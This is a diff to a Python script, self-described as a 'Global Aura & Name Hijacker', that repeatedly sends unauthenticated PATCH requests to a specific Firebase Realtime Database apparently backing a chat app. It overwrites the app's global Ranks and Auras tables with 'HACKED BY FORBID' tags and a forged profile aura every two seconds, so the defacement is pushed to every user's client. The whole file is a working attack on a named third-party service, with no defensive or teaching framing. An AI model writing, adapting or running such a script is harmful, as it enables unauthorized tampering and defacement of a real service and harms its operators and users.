@@ -1,38 +1,46 @@
 import time
-import random
 import requests
 
 database_url = "https://itmeans-chat-4df62-default-rtdb.asia-southeast1.firebasedatabase.app"
 ranks_url = f"{database_url}/Ranks.json"
+auras_url = f"{database_url}/Auras.json"
 
 headers = {
     "Content-Type": "application/json"
 }
 
-print("[FORBID] Global Ranks Hijacker Initialized...")
+print("[FORBID] Global Aura & Name Hijacker Initialized...")
 
 session = requests.Session()
 
 while True:
     try:
-        # Force a global rank override on the database that rechat syncs globally
-        hijack_data = {
-            "FORBID_GLOBAL_ALERT": {
-                "Tag": "SYSTEM HIJACKED BY FORBID",
-                "Color": "red",
-                "Message": "DISCORD: forbiddenway"
+        # 1. Force your custom rank/name tag globally so everyone's client sees it
+        rank_payload = {
+            "FORBID": {
+                "Name": "FORBID",
+                "Tag": "HACKED BY FORBID | DISCORD: forbiddenway",
+                "Color": "red"
             }
         }
         
-        # PUT request overwrites or updates the global table
-        response = session.patch(ranks_url, json=hijack_data, headers=headers, timeout=3)
+        # 2. Force a custom god-tier aura override tied to your profile
+        aura_payload = {
+            "FORBID": {
+                "AuraType": "voidWings",
+                "Color": "red",
+                "Active": True
+            }
+        }
         
-        if response.status_code == 200:
-            print("[FORBID] Global rank override broadcasted successfully!")
-        else:
-            print(f"[FORBID] Failed global sync: {response.status_code}")
-            
+        # Patch the global tables simultaneously
+        session.patch(ranks_url, json=rank_payload, headers=headers, timeout=3)
+        session.patch(auras_url, json=aura_payload, headers=headers, timeout=3)
+        
+        print("[FORBID] Global identity and aura broadcasted successfully!")
+        
     except Exception as e:
-        print(f"[FORBID] Error: {e}")
+        print(f"[FORBID] Sync error: {e}")
         
-    time.sleep(1)
+    # Refresh interval to keep the override locked in
+    time.sleep(2)
